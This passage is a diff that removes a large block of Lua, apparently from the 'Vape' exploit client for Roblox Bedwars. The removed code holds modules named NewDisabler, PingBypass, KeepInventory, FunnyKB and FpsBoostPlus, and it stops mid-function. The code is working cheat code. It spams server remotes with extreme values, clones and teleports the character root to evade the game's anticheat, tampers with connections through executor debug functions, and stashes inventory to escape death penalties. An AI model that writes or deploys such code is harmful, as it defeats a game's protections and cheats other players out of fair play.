-								task.wait(GuiLibrary.ObjectsThatCanBeSaved.ReducePacketsOptionsButton.Api.Enabled and GuiLibrary.ObjectsThatCanBeSaved.ReducePacketsDisablerToggle.Api.Enabled and 0.1 or 0.06)
-								if ((bedwarsStore.attackReachUpdate - 0.8) > tick() and ((realDisabler - 0.2) <= tick())) then
-									bedwarsStore.disabler = tick()
-									bedwarsStore.disabledFloat = false
-								else
-									if realDisabler > tick() then
-										bedwarsStore.disabledFloat = true
-										bedwarsStore.disabler = realDisabler
-									else
-										bedwarsStore.disabledFloat = false
-									end
-								end
-								if NewDisablerSlowdown.Enabled and ((bedwarsStore.attackReachUpdate - 0.8) > tick()) then
-									if bedwarsStore.disablerSpeed ~= 20 then
-										bedwarsStore.disablerSpeed = 20
-										autoConfigure()
-									end
-								else
-									if bedwarsStore.disablerSpeed ~= (shared.pingbypassroot and canpingbypass and NewDisablerSpeed.Value or 20) then
-										bedwarsStore.disablerSpeed = (shared.pingbypassroot and canpingbypass and NewDisablerSpeed.Value or 20)
-										autoConfigure()
-									end
-								end
-							until not NewDisabler.Enabled
-						end)
-						repeat
-							task.wait(GuiLibrary.ObjectsThatCanBeSaved.ReducePacketsOptionsButton.Api.Enabled and GuiLibrary.ObjectsThatCanBeSaved.ReducePacketsDisablerToggle.Api.Enabled and 0.1 or 0.06)
-							if (NewDisablerSlowdown.Enabled and ((bedwarsStore.attackReachUpdate - 0.8) < tick())) or not NewDisablerSlowdown.Enabled then
-								local item = getItemNear("scythe")
-								if item and lplr.Character.HandInvItem.Value == item.tool and bedwars.CombatController then
-									local moveVec = entityLibrary.character.Humanoid.MoveDirection
-									local oldVec = moveVec == moveVec and moveVec ~= Vector3.zero and moveVec or entityLibrary.character.HumanoidRootPart.CFrame.lookVector
-									bedwars.ClientHandler:Get("ScytheDash"):SendToServer({direction = oldVec * 99999})
-								end
-							end
-						until not NewDisabler.Enabled
-					end)
-				end
-			end
-		})
-		local canNotify = tick()
-		NewDisablerSpeed = NewDisabler.CreateSlider({
-			Name = "Speed",
-			Min = 0,
-			Max = 60,
-			Default = 20,
-			Function = function(val)
-				if val > 20 and NewDisabler.Enabled and not shared.pingbypassroot and canNotify <= tick() then
-					canNotify = tick() + 5
-					warningNotification("NewDisabler", "Enable PingBypass to use a higher CFrame", 5)
-				end
-				bedwarsStore.disablerSpeed = val
-				if NewDisablerAutoConfigure.Enabled then
-					autoConfigure()
-				end
-			end
-		})
-		NewDisablerSlowdown = NewDisabler.CreateToggle({
-			Name = "Slowdown",
-			Default = true,
-			HoverText = "Slow down while attacking (prevent some flags)",
-			Function = blankFunction
-		})
-		NewDisablerAutoConfigure = NewDisabler.CreateToggle({
-			Name = "Auto Config",
-			Default = false,
-			HoverText = "Automatically configure PingBypass settings based on your disabler speed",
-			Function = function(callback)
-				if callback then
-					autoConfigure()
-				end
-			end
-		})
-	end)
-	
-	runFunction(function()
-		local PingBypass = {Enabled = false}
-		local PingBypassShowRoot = {Enabled = false}
-	
-		local BypassNumbers = {
-			Speed = 1000,
-			Lerp = 0.3,
-			Frequency = 0.33,
-			TPLowest = 0.05,
-			TPPrecise = 20,
-			TPRecheck = 20,
-			SlowdownDistance = 300,
-			Slowdown = 0.7,
-		}
-	
-		local clonesuccess = false
-		local disabledproper = true
-		local cloned
-		local clone
-		local hip
-	
-		local function disablefunc()
-			disabledproper = true
-			if not shared.pingbypassroot or not shared.pingbypassroot.Parent then return end
-			lplr.Character.Parent = game
-			entityLibrary.character.HumanoidRootPart:Destroy()
-			entityLibrary.character.HumanoidRootPart = shared.pingbypassroot
-			shared.pingbypassroot.Parent = lplr.Character
-			shared.pingbypassroot.Transparency = 1
-			lplr.Character.PrimaryPart = shared.pingbypassroot
-			lplr.Character.PrimaryPart.Transparency = 1
-			lplr.Character.Parent = workspace
-			shared.pingbypassroot.CanCollide = true
-			for i,v in next, (lplr.Character:GetDescendants()) do 
-				if v:IsA("Weld") or v:IsA("Motor6D") then 
-					if v.Part0 == clone then v.Part0 = shared.pingbypassroot end
-					if v.Part1 == clone then v.Part1 = shared.pingbypassroot end
-				end
-				if v:IsA("BodyVelocity") then 
-					v:Destroy()
-				end
-			end
-			for i,v in next, (shared.pingbypassroot:GetChildren()) do 
-				if v:IsA("BodyVelocity") then 
-					v:Destroy()
-				end
-			end
-			local oldclonepos = clone.Position.Y
-			if clone then 
-				clone:Destroy()
-				clone = nil
-			end
-			lplr.Character.Humanoid.HipHeight = hip or 2
-			local origcf = {shared.pingbypassroot.CFrame:GetComponents()}
-			origcf[2] = oldclonepos
-			shared.pingbypassroot.CFrame = CFrame.new(unpack(origcf))
-			shared.pingbypassroot = nil
-		end
-	
-		table.insert(vapeConnections, lplr:GetAttributeChangedSignal("LastTeleported"):Connect(function()
-			if shared.pingbypassroot and cloned == lplr.Character and clone and math.abs(lplr:GetAttribute("SpawnTime") - lplr:GetAttribute("LastTeleported")) > 3 then
-				clone.CFrame = shared.pingbypassroot.CFrame
-			end
-		end))
-	
-		table.insert(vapeConnections, vapeEvents.EntityDeathEvent.Event:Connect(function(deathTable)
-			if PingBypass.Enabled and deathTable.entityInstance == lplr.Character and not deathTable.finalKill then
-				PingBypass.ToggleButton(false)
-			    repeat task.wait(0.03) until entityLibrary.isAlive and entityLibrary.character.Humanoid.Health > 0 and isnetworkowner(entityLibrary.character.HumanoidRootPart)
-				task.wait(0.7)
-                if not PingBypass.Enabled then
-			        PingBypass.ToggleButton(false)
-				end
-			end
-		end))
-	
-		local oldseattab = Instance.new("BindableEvent")
-	
-		local function check()
-			if clone and shared.pingbypassroot and (shared.pingbypassroot.Position - clone.Position).magnitude >= (BypassNumbers.TPRecheck + getSpeed()) and canpingbypass then
-				clone.CFrame = shared.pingbypassroot.CFrame
-			end
-		end
-	
-		local oldEntityNearPosition
-		local oldAllNearPosition
-		
-		local bodyvelo
-		local teleportDistance = 0
-	
-		local function teleportTo(cframe)
-			local mag = (clone.CFrame.p - cframe.p).magnitude
-			shared.pingbypassroot.CFrame = cframe
-			teleportDistance += mag
-		end
-	
-		local fpslist = {}
-		local function getaverageframerate()
-			local frames = 0
-			for i,v in next, (fpslist) do 
-				frames = frames + v
-			end
-			return #fpslist > 0 and (frames / (60 * #fpslist)) <= 1.2 or #fpslist <= 0
-		end
-
-		local listenerCreated = false
-		local attemptedBypass
-	
-		PingBypass = GuiLibrary.ObjectsThatCanBeSaved.WorldWindow.Api.CreateOptionsButton({
-			Name = "PingBypass",
-			HoverText = "Bedwars 2021 anticheat",
-			Function = function(callback)
-				if callback then
-					if not entityLibrary.isAlive then 
-						disabledproper = true
-					end
-					if not disabledproper then 
-						warningNotification("PingBypass", "Wait until PingBypass finishes", 3)
-						PingBypass.ToggleButton(false)
-						return
-					end
-					clonesuccess = false
-					if not listenerCreated then
-						listenerCreated = true
-						task.delay(0.03, function()
-							repeat
-								if clonesuccess then break end
-								if PingBypass.Enabled then
-									PingBypass.ToggleButton(false)
-								end
-								repeat task.wait(0.03) until entityLibrary.isAlive and entityLibrary.character.Humanoid.Health > 0 and isnetworkowner(entityLibrary.character.HumanoidRootPart)
-								task.wait(attemptedBypass and attemptedBypass == lplr.Character and 0 or 0.7)
-								if not PingBypass.Enabled then
-									PingBypass.ToggleButton(false)
-								end
-							until clonesuccess
-							listenerCreated = false
-						end)
-					end
-					attemptedBypass = lplr.Character
-					if entityLibrary.isAlive and entityLibrary.character.Humanoid.Health > 0 and isnetworkowner(entityLibrary.character.HumanoidRootPart) then
-						cloned = lplr.Character
-						shared.pingbypassroot = entityLibrary.character.HumanoidRootPart
-						if not lplr.Character.Parent then
-							PingBypass.ToggleButton(false)
-							return
-						end
-						lplr.Character.Parent = game
-						clone = shared.pingbypassroot:Clone()
-						clone.Parent = lplr.Character
-						shared.pingbypassroot.Parent = gameCamera
-						bedwars.QueryUtil:setQueryIgnored(shared.pingbypassroot, true)
-						if PingBypassShowRoot.Enabled then
-							shared.pingbypassroot.Transparency = 0.7
-							shared.pingbypassroot.Color = Color3.new(0.4, 1, 0.4)
-						end
-						clone.CFrame = shared.pingbypassroot.CFrame
-						lplr.Character.PrimaryPart = clone
-						lplr.Character.Parent = workspace
-						for i,v in next, (lplr.Character:GetDescendants()) do 
-							if v:IsA("Weld") or v:IsA("Motor6D") then 
-								if v.Part0 == shared.pingbypassroot then v.Part0 = clone end
-								if v.Part1 == shared.pingbypassroot then v.Part1 = clone end
-							end
-							if v:IsA("BodyVelocity") then 
-								v:Destroy()
-							end
-						end
-						for i,v in next, (shared.pingbypassroot:GetChildren()) do 
-							if v:IsA("BodyVelocity") then 
-								v:Destroy()
-							end
-						end
-						bodyvelo = Instance.new("BodyVelocity")
-						bodyvelo.MaxForce = Vector3.new(0, 9e9, 0)
-						bodyvelo.Velocity = Vector3.zero
-						bodyvelo.Parent = shared.pingbypassroot
-						lplr.Character.Humanoid.HipHeight = hip or 2
-						hip = lplr.Character.Humanoid.HipHeight
-						entityLibrary.character.HumanoidRootPart = clone
-						clonesuccess = true
-					end
-					if not clonesuccess then 
-						warningNotification("PingBypass", "Character missing", 3)
-						PingBypass.ToggleButton(false)
-						return
-					end
-					oldEntityNearPosition = EntityNearPosition
-					EntityNearPosition = function(distance, ignore, overridepos)
-						overridepos = overridepos or shared.pingbypassroot and shared.pingbypassroot.Position
-						return oldEntityNearPosition(distance, ignore, overridepos)
-					end
-					oldAllNearPosition = AllNearPosition
-					AllNearPosition = function(distance, amount, sortfunction, prediction, overridepos)
-						overridepos = overridepos or shared.pingbypassroot and shared.pingbypassroot.Position
-						return oldAllNearPosition(distance, amount, sortfunction, prediction, overridepos)
-					end
-					task.spawn(function()
-						table.clear(fpslist)
-						repeat
-							if not PingBypass.Enabled then break end
-							local fps = math.floor(1 / runService.Heartbeat:Wait())
-							if #fpslist >= 10 then 
-								table.remove(fpslist, 1)
-							end
-							table.insert(fpslist, fps)
-							task.wait(1)
-						until not PingBypass.Enabled
-					end)
-					RunLoops:BindToHeartbeat("PingBypass", function()
-						local root = entityLibrary.isAlive and entityLibrary.character.HumanoidRootPart
-						if isnetworkowner(shared.pingbypassroot) and root then
-							local sit = entityLibrary.character.Humanoid.Sit
-							if sit ~= oldseat then 
-								if sit then 
-									for i,v in next, (workspace:GetDescendants()) do 
-										if not v:IsA("Seat") then continue end
-										local weld = v:FindFirstChild("SeatWeld")
-										if weld and weld.Part1 == shared.pingbypassroot then 
-											weld.Part1 = clone
-											pcall(function()
-												for i,v in next, (getconnections(v:GetPropertyChangedSignal("Occupant"))) do
-													local newfunc = debug.getupvalue(debug.getupvalue(v.Function, 1), 3) 
-													debug.setupvalue(newfunc, 4, {
-														GetPropertyChangedSignal = function(self, prop)
-															return oldseattab.Event
-														end
-													})
-													newfunc()
-												end
-											end)
-										end
-									end
-								else
-									oldseattab:Fire(false)
-								end
-								oldseat = sit	
-							end
-							if not canpingbypass then
-								if bodyvelo then
-									bodyvelo:Destroy()
-									bodyvelo = nil
-								end
-								return
-							else
-								if bodyvelo == nil then
-									bodyvelo = Instance.new("BodyVelocity")
-									bodyvelo.MaxForce = Vector3.new(0, 9e9, 0)
-									bodyvelo.Velocity = Vector3.zero
-									bodyvelo.Parent = shared.pingbypassroot
-								end
-							end
-							local targetvelo = root.AssemblyLinearVelocity
-							local speed = (sit or bedwars.HangGliderController.hangGliderActive) and targetvelo.Magnitude or (23 + getSpeed())
-							targetvelo = (targetvelo.Unit == targetvelo.Unit and targetvelo.Unit or Vector3.zero) * 20
-							bodyvelo.Velocity = Vector3.new(0, math.abs(root.Velocity.Y) <= 0.01 and 0 or root.Velocity.Y, 0)
-							if root.Velocity.Magnitude <= 0.01 then
-								shared.pingbypassroot.Velocity = Vector3.zero
-							else
-								shared.pingbypassroot.Velocity = Vector3.new(math.clamp(targetvelo.X, -speed, speed), root.Velocity.Y, math.clamp(targetvelo.Z, -speed, speed))
-							end
-							_VapeApi.NoMove = nil
-						else
-							_VapeApi.NoMove = true
-							root.Velocity = Vector3.zero
-							root.AssemblyLinearVelocity = Vector3.zero
-							root.AssemblyAngularVelocity = Vector3.zero
-							shared.pingbypassroot.Velocity = Vector3.zero
-							shared.pingbypassroot.AssemblyLinearVelocity = Vector3.zero
-						end
-						shared.pingbypassroot.AssemblyAngularVelocity = Vector3.zero
-					end)
-					task.spawn(function()
-						repeat
-							task.wait()
-							if entityLibrary.isAlive then
-								if isnetworkowner(shared.pingbypassroot) then
-									if not entityLibrary.character.Humanoid.Sit then
-										if not canpingbypass then
-											continue
-										end
-										if _VapeApi.NoFlag then
-											_VapeApi.NoFlag = nil
-											clone.CFrame = shared.pingbypassroot.CFrame
-											continue
-										end
-										if NewDisablerSlowdown.Enabled and (bedwarsStore.attackReachUpdate > tick()) then
-											shared.pingbypassroot.CFrame = clone.CFrame
-											continue
-										end
-										if (cloned.Humanoid.FloorMaterial ~= Enum.Material.Air or bedwarsStore.disabledFloat) and (teleportDistance >= BypassNumbers.SlowdownDistance) then
-											teleportDistance = 0
-											_VapeApi.NoMove = true
-											warningNotification("PingBypass", "slowdown", BypassNumbers.Slowdown)
-											task.delay(BypassNumbers.Slowdown, function()
-												_VapeApi.NoMove = nil
-											end)
-										end
-										local frameratecheck = getaverageframerate()
-										local framerate = BypassNumbers.Frequency <= 0.3 and frameratecheck and -0.22 or 0
-										local framerate2 = BypassNumbers.Frequency <= 0.3 and frameratecheck and -0.01 or 0
-										framerate = math.floor((BypassNumbers.Lerp + framerate) * 100) / 100
-										framerate2 = math.floor((BypassNumbers.Frequency + framerate2) * 100) / 100
-										local needsfix = false
-										for i = 1, 2 do
-											check()
-											task.wait(i % 2 == 0 and 0.01 or 0.02)
-											check()
-											if shared.pingbypassroot then
-												if (shared.pingbypassroot.CFrame.p - clone.CFrame.p).magnitude >= BypassNumbers.TPLowest then
-													local offsety = entityLibrary.character.HumanoidRootPart.Position.Y - shared.pingbypassroot.Position.Y
-													if math.abs(offsety) <= 1 then
-														local newcf = shared.pingbypassroot.CFrame:lerp(clone.CFrame + Vector3.new(0, offsety, 0), framerate)
-														if not getPlacedBlock(newcf.p) then
-															teleportTo(newcf)
-														else
-															needsfix = true
-														end
-													else
-														local newcf = shared.pingbypassroot.CFrame:lerp(clone.CFrame, framerate)
-														if not getPlacedBlock(newcf.p) then
-															teleportTo(newcf)
-														else
-															needsfix = true
-														end
-													end
-												end
-											end
-										end
-										check()
-										task.wait(framerate2)
-										check()
-										if shared.pingbypassroot then
-											local mag = (shared.pingbypassroot.CFrame.p - clone.CFrame.p).magnitude
-											if mag >= BypassNumbers.TPLowest and (mag <= BypassNumbers.TPPrecise or needsfix) then
-												local offsety = entityLibrary.character.HumanoidRootPart.Position.Y - shared.pingbypassroot.Position.Y
-												if math.abs(offsety) <= 1 then
-													teleportTo(clone.CFrame + Vector3.new(0, offsety, 0))
-												else
-													teleportTo(clone.CFrame)
-												end
-											end
-										end
-									else
-										clone.CFrame = shared.pingbypassroot.CFrame
-									end
-								else
-									clone.CFrame = shared.pingbypassroot.CFrame
-									teleportDistance = 0
-								end
-							end
-						until not PingBypass.Enabled
-					end)
-				else
-					RunLoops:UnbindFromHeartbeat("PingBypass")
-					if clonesuccess and shared.pingbypassroot and clone and lplr.Character.Parent == workspace and shared.pingbypassroot.Parent ~= nil and disabledproper and cloned == lplr.Character then 
-						local origcf = {clone.CFrame:GetComponents()}
-						origcf[1] = shared.pingbypassroot.Position.X
-						origcf[2] = shared.pingbypassroot.Position.Y
-						origcf[3] = shared.pingbypassroot.Position.Z
-						shared.pingbypassroot.CFrame = CFrame.new(unpack(origcf))
-						entityLibrary.character.Humanoid:ChangeState(Enum.HumanoidStateType.Landed)
-						disabledproper = false
-						disablefunc()
-					end
-					if oldEntityNearPosition then
-						EntityNearPosition = oldEntityNearPosition
-					end
-					if oldAllNearPosition then
-						AllNearPosition = oldAllNearPosition
-					end
-				end
-			end
-		})
-		--[=[PingBypass.CreateSlider({
-			Name = "Speed",
-			Min = 0,
-			Max = 1400,
-			Default = BypassNumbers.Speed,
-			Function = function(val) BypassNumbers.Speed = val end
-		})]=]
-		PingBypass.CreateSlider({
-			Name = "Lerp",
-			Min = 0,
-			Max = 100,
-			Default = BypassNumbers.Lerp * 100,
-			Double = 100,
-			Function = function(val) BypassNumbers.Lerp = val / 100 end
-		})
-		PingBypass.CreateSlider({
-			Name = "Frequency",
-			Min = 0,
-			Max = 100,
-			Default = BypassNumbers.Frequency * 100,
-			Double = 100,
-			Function = function(val) BypassNumbers.Frequency = val / 100 end
-		})
-		PingBypass.CreateSlider({
-			Name = "Lowest Distance",
-			Min = 0.05,
-			Max = 23,
-			Default = BypassNumbers.TPLowest,
-			Function = function(val) BypassNumbers.TPLowest = val end
-		})
-		PingBypass.CreateSlider({
-			Name = "Precision",
-			Min = 0.05,
-			Max = 23,
-			Default = BypassNumbers.TPPrecise,
-			Function = function(val) BypassNumbers.TPPrecise = val end
-		})
-		PingBypass.CreateSlider({
-			Name = "Recheck",
-			Min = 0,
-			Max = 23,
-			Default = BypassNumbers.TPRecheck,
-			Function = function(val) BypassNumbers.TPRecheck = val end
-		})
-		PingBypass.CreateSlider({
-			Name = "Slowdown Distance",
-			Min = 300,
-			Max = 600,
-			Default = BypassNumbers.SlowdownDistance,
-			Function = function(val) BypassNumbers.SlowdownDistance = val end
-		})
-		PingBypass.CreateSlider({
-			Name = "Slowdown",
-			Min = 0,
-			Max = 200,
-			Default = BypassNumbers.Slowdown * 100,
-			Double = 100,
-			Function = function(val) BypassNumbers.Slowdown = val / 100 end
-		})
-		PingBypassShowRoot = PingBypass.CreateToggle({
-			Name = "Show Root",
-			Function = function(callback)
-				if callback then
-					if shared.pingbypassroot then
-						shared.pingbypassroot.Transparency = 0.7
-						shared.pingbypassroot.Color = Color3.new(0.4, 1, 0.4)
-					end
-				else
-					if shared.pingbypassroot then
-						shared.pingbypassroot.Transparency = 1
-					end
-				end
-			end,
-			Default = true
-		})
-	end)
-	
-	runFunction(function()
-		local KeepInventory = {Enabled = false}
-		local KeepInventoryLagback = {Enabled = false}
-
-		local enderchest
-		local function getEnderchest()
-			enderchest = enderchest or replicatedStorageService.Inventories[lplr.Name.."_personal"]
-			return enderchest
-		end
-
-		local GetItem = bedwars.ClientHandler:GetNamespace("Inventory"):Get("ChestGetItem")
-		local GiveItem = bedwars.ClientHandler:GetNamespace("Inventory"):Get("ChestGiveItem")
-		local ResetRemote = bedwars.ClientHandler:Get(bedwars.ResetRemote)
-		local deposited = false
-
-		local function collectEnderchest()
-			if deposited then
-				deposited = false
-				repeat task.wait() until entityLibrary.isAlive
-				lplr.Character:WaitForChild("InventoryFolder")
-				repeat task.wait() until lplr.Character.InventoryFolder.Value ~= nil
-				local enderchest = getEnderchest()
-				for _, item in next, enderchest:GetChildren() do
-					GetItem:CallServerAsync(enderchest, item)
-				end
-			end
-		end
-
-		local function depositAndWaitForRespawn(yield)
-			if not deposited then
-				deposited = true
-				local inventory = lplr.Character:FindFirstChild("InventoryFolder")
-				if inventory then 
-					inventory = inventory.Value
-					local enderchest = getEnderchest()
-					local count = 0
-					for _, item in next, inventory:GetChildren() do
-						task.spawn(function()
-							GiveItem:CallServer(enderchest, item)
-							count -= 1
-						end)
-						count += 1
-					end
-					if yield then
-						repeat task.wait() until count <= 0
-					end
-					lplr.CharacterAdded:Once(collectEnderchest)
-				end
-			end
-		end
-
-		local resetCallback = Instance.new("BindableEvent")
-		resetCallback.Event:Connect(function()
-			warningNotification("KeepInventory", "Resetting, storing items", 5)
-			depositAndWaitForRespawn(true)
-			ResetRemote:SendToServer()
-		end)
-
-		KeepInventory = GuiLibrary.ObjectsThatCanBeSaved.UtilityWindow.Api.CreateOptionsButton({
-			Name = "KeepInventory",
-			Function = function(callback)
-				if callback then
-					starterGui:SetCore("ResetButtonCallback", resetCallback)
-					if KeepInventoryLagback.Enabled then
-						task.spawn(function()
-							repeat
-								task.wait(0.1)
-								if entityLibrary.isAlive then
-									if not isnetworkowner(entityLibrary.character.HumanoidRootPart) and bedwarsStore.queueType:find("skywars") == nil then
-										if not deposited then
-											warningNotification("KeepInventory", "Lagback detected, storing items", 5)
-											task.spawn(function()
-												local suc, res = pcall(function() return lplr.leaderstats.Bed.Value == "✅"  end)
-												repeat task.wait() until not KeepInventory.Enabled or (isnetworkowner(entityLibrary.character.HumanoidRootPart) and suc and res) or (suc and res == nil)
-												if entityLibrary.isAlive then
-													collectEnderchest()
-												end
-											end)
-										end
-										depositAndWaitForRespawn(true)
-									end
-								end
-							until not (KeepInventory and KeepInventoryLagback.Enabled)
-						end)
-					end
-					table.insert(KeepInventory.Connections, vapeEvents.EntityDamageEvent.Event:Connect(function(damageTable)
-						if damageTable.entityInstance == lplr.Character and damageTable.fromEntity and damageTable.damage and bedwarsStore.queueType:find("skywars") == nil then
-							local plr = playersService:GetPlayerFromCharacter(damageTable.fromEntity)
-							local health = lplr.Character:GetAttribute("Health") or 150
-							local stash = plr == nil and (health / damageTable.damage) <= 2
-							if plr then
-								local winning, hits, _hits = calculateHits(plr, false)
-								stash = (_hits - hits) >= 4
-							end
-							if stash then
-								if not deposited then
-									warningNotification("KeepInventory", "Possible death imminent, storing items", 5)
-									task.spawn(function()
-										local suc, res = pcall(function() return lplr.leaderstats.Bed.Value == "✅"  end)
-										repeat task.wait() until not KeepInventory.Enabled or (suc and res and (workspace:GetServerTimeNow() - lplr.Character:GetAttribute("LastDamageTakenTime")) > 2) or (suc and res == nil)
-										if entityLibrary.isAlive then
-											collectEnderchest()
-										end
-									end)
-								end
-								depositAndWaitForRespawn(true)
-							end
-						end
-					end))
-				else
-					oldCallback = oldCallback or bedwars.ResetController:createBindable()
-					starterGui:SetCore("ResetButtonCallback", oldCallback)
-				end
-			end
-		})
-		KeepInventoryLagback = KeepInventory.CreateToggle({
-			Name = "Lagback",
-			Function = blankFunction
-		})
-	end)
-	
-	runFunction(function()
-		local FunnyKB = {Enabled = false}
-		local FunnyKBSpeed = {Value = 23}
-
-		FunnyKB = GuiLibrary.ObjectsThatCanBeSaved.UtilityWindow.Api.CreateOptionsButton({
-			Name = "FunnyKB",
-			Function = function(callback)
-				if callback then
-					table.insert(FunnyKB.Connections, vapeEvents.StatefulEntityPlayerKnockbackRequest.Event:Connect(function(knockbackTable)
-						if entityLibrary.isAlive and knockbackTable.impulse then
-							lplr.Character:SetAttribute("SpeedBoost", (FunnyKBSpeed.Value - GuiLibrary.ObjectsThatCanBeSaved.SpeedSpeedSlider.Api.Value) / 8)
-							task.delay(0.5, function()
-								lplr.Character:SetAttribute("SpeedBoost", nil)
-							end)
-						end
-					end))
-				end
-			end
-		})
-		FunnyKBSpeed = FunnyKB.CreateSlider({
-			Name = "Speed",
-			Min = 23,
-			Max = 100,
-			Default = 60,
-			Function = blankFunction
-		})
-	end)
-
-	runFunction(function()
-		local FpsBoostPlus = {Enabled = false}
-		
-		local FpsBoostSelf = {Enabled = false}
-		local FpsBoostModel = {Enabled = false}
-		local FpsBoostImages = {Enabled = false}
-		local FpsBoostBlocks = {Enabled = false}
-		local FpsBoostAccessories = {Enabled = false}
-		local FpsBoostLighting = {Enabled = false}
-		local FpsBoostConnection = {Enabled = false}
-		local FpsBoostBeta = {Enabled = false}
-	
-		local Map = workspace:FindFirstChild("Map")
-	
-		local settingsCache
-	
-		local function getSettings()
-			if settingsCache == nil then
-				settingsCache = typeof(settings) == "Instance" and settings or typeof(settings) == "function" and settings()
-			end
-			return settingsCache or {}
-		end
-	
-		local function checkWhitelisted(instance, check)
-			if check == "Character" then
-				local localcheck = (lplr.Character == nil or (lplr.Character and not instance:IsDescendantOf(lplr.Character))) or FpsBoostSelf.Enabled
-				local modelcheck = instance:FindFirstAncestorWhichIsA("Model") or FpsBoostModel.Enabled
-				return localcheck and modelcheck and true or false
-			elseif check == "Images" then
-				return (instance:IsA("ImageLabel") or instance:IsA("ImageButton")) and FpsBoostImages.Enabled
-			elseif check == "Block" then
-				local blockcheck = Map == nil or not instance:IsDescendantOf(Map) or FpsBoostBlocks.Enabled
-				return blockcheck
-			elseif check == "Clothing" then
-				return instance:IsA("Clothing") and FpsBoostAccessories.Enabled
-			elseif check == "Lighting" then
-				return FpsBoostLighting.Enabled
-			elseif check == "Connection" then
-				return FpsBoostConnection.Enabled
-			end
-		end
-	
-		local part_operations = 0
-	
-		local textures = {}
-	
-		local function cleantexture(obj)
-			if checkWhitelisted(obj, "Block") then
-				runService.PostSimulation:Wait()
-				table.insert(textures, { Object = obj, Material = obj.Material })
-				obj.Material = Enum.Material.SmoothPlastic
-				part_operations += 1
-				for i2,v2 in next, (obj:GetChildren()) do
-					if v2:IsA("Texture") then
-						table.insert(textures, { Object = v2, Texture = v2.Texture, Material = obj.Material })
-						v2.Texture = "rbxassetid://0"
-						v2.Transparency = 1
-						part_operations += 2
-					end
-				end
-			end
-		end
-	
-		local blockconnection
-	
-		local function textureschange(callback)
-			if callback then
-				if blockconnection then
-					blockconnection:Disconnect()
-				end
-				if checkWhitelisted(nil, "Connection") then
-					blockconnection = collectionService:GetInstanceAddedSignal("block"):Connect(cleantexture, obj)
-				end
-				for i, block in next, (collectionService:GetTagged("block")) do
-					task.spawn(cleantexture, block)
-				end
-			else
-				if blockconnection then
-					blockconnection:Disconnect()
-				end
-				for i, v in next, (textures) do
-					if v.Object and v.Texture then
-						v.Object.Texture = v.Texture or "rbxassetid://0"
-						v.Object.Transparency = 0
-					end
-					if v.Object and v.Material then
-						pcall(function()
-							v.Object.Material = v.Material
-						end)
-					end
-					textures[i] = nil
-				end
-			end
-		end
-		local bad_instances = 0
-		local mesh_instances = 0
-	
-		local CanBeEnabled = {"ParticleEmitter", "Trail", "Smoke", "Fire", "Sparkles", "PostEffect", "SpotLight"}
-		local function filterinstance(instance)
-			if checkWhitelisted(instance, "Character") then
-				if instance:IsA("Model") then
-					instance.LevelOfDetail = Enum.ModelLevelOfDetail.Disabled
-					instance.ModelStreamingMode = Enum.ModelStreamingMode.Nonatomic
-					part_operations += 2
-				end
-				if instance:IsA("FaceInstance") then
-					if checkWhitelisted(instance, "Block") then
-						instance.Transparency = 1
-						instance.Shiny = 0
-						part_operations += 2
-					end
-				end
-				if table.find(CanBeEnabled, instance.ClassName) then
-					instance.Enabled = false
-					part_operations += 1
-				end
-				if instance:IsA("Explosion") then
-					instance.BlastPressure = 1
-					instance.BlastRadius = 1
-					instance.Visible = false
-					part_operations += 3
-				end
-				if checkWhitelisted(instance, "Images") then
-					instance.Image = "rbxassetid://0"
-					part_operations += 1
-				end
-				if checkWhitelisted(instance, "Clothing") then
-					task.delay(0.01, function()
-						instance.Parent = nil
-						part_operations += 1
-					end)
-				end
-				if instance:IsA("BasePart") or instance:IsA("Part") or instance:IsA("Union") or instance:IsA("CornerWedgePart") or instance:IsA("TrussPart") then
-					if checkWhitelisted(instance, "Block") then
-						instance.Material = Enum.Material.SmoothPlastic
-						part_operations += 1
-					end
-					--instance.Reflectance = 0
-					part_operations += 1
-					if FpsBoostBeta.Enabled then
-						if instance:IsA("BasePart") then
-							instance.CastShadow = false
-							if (lplr.Character == nil or (lplr.Character and not instance:IsDescendantOf(lplr.Character))) and not instance.Parent:IsA("Model") then
-								sethiddenproperty(instance, "NetworkIsSleeping", true)
-							end
-							part_operations += 1
-						end
-						if instance:IsA("MeshPart") or instance:IsA("Union") then
-							if instance.RenderFidelity == Enum.RenderFidelity.Precise then
-								bad_instances += 1
-							end
-							mesh_instances += 1
-							instance.DoubleSided = false
-							--instance.RenderFidelity = Enum.RenderFidelity.Performance
-							--instance.CollisionFidelity = Enum.CollisionFidelity.Box
-							part_operations += 1
-						end
-					end
-				end
-				if instance:IsA("ParticleEmitter") or instance:IsA("Trail") then
-					instance.Lifetime = NumberRange.new(0)
-					part_operations += 1
-				end
-			end
-		end
-	
-		local disable = {
-			"dodo_bird",
-			"mount_sitting",
-			"carrot_cannon",
-			"paint_shotgun",
-			"guided_projectile",
-			"lightning_beams",
-			"bee_wander",
-			"mass_hammer",
-			"yeti_kit",
-			"player_vacuum",
-			"mage_status_effect",
-			"stopwatch_controller",
-			"life_steal",
-			"decay_controller",
-			"gun_game",
-			"flag_capture",
-			"flagman_controller",
-			"launch_pad",
-			"survival_controller",
-			"drone_controller",
-		}
-	
-		local function checkblocked(str)
-			str = str:gsub("-", "_")
-			for i, v in next, (disable) do
-				if str:find(v) then
-					return true
-				end
-			end
-			return nil
-		end
-	
-		local runserverconnections = {
-			Heartbeat = {},
-			Stepped = {},
-			PreSimulation = {},
-			PostSimulation = {},
-			PreAnimation = {},
-			PreRender = {},
-			RenderStepped = {},
-		}
-
-		local whitelistedblocks = {
-			bed = true,
-		}
-
-		local cachedBlockPositions = {}
-
-		local cachedNormalSides2 = Enum.NormalId:GetEnumItems()
-		local function isBlockCovered2(pos)
-			local coveredsides = 0
-			for i, v in next, (cachedNormalSides2) do
-				local blockpos = (pos + (Vector3.FromNormalId(v) * 3))
-				if getPlacedBlock(blockpos) then
-					coveredsides = coveredsides + 1
-				end
-			end
-			return coveredsides == #cachedNormalSides2
-		end
-
-		local function purgeBlocks(block)
-			if block:GetAttribute("PlacedByUserId") == 0 and whitelistedblocks[block.Name] == nil then
-				if isBlockCovered2(bedwars.BlockController:getBlockPosition(block.Position) * 3) then
-					collectionService:RemoveTag(block, "block")
-					block:Destroy()
-				end
-			end
-		end
-	
-		FpsBoostPlus = GuiLibrary.ObjectsThatCanBeSaved.RenderWindow.Api.CreateOptionsButton({
-			Name = "FpsBoostPlus",
-			Function = function(callback)
-				if callback then
-					task.spawn(function()
-						repeat task.wait() until shared.VapeFullyLoaded
-						Map = workspace:WaitForChild("Map", 9e9)
-						task.spawn(textureschange, true)
-						table.clear(cachedBlockPositions)
-	
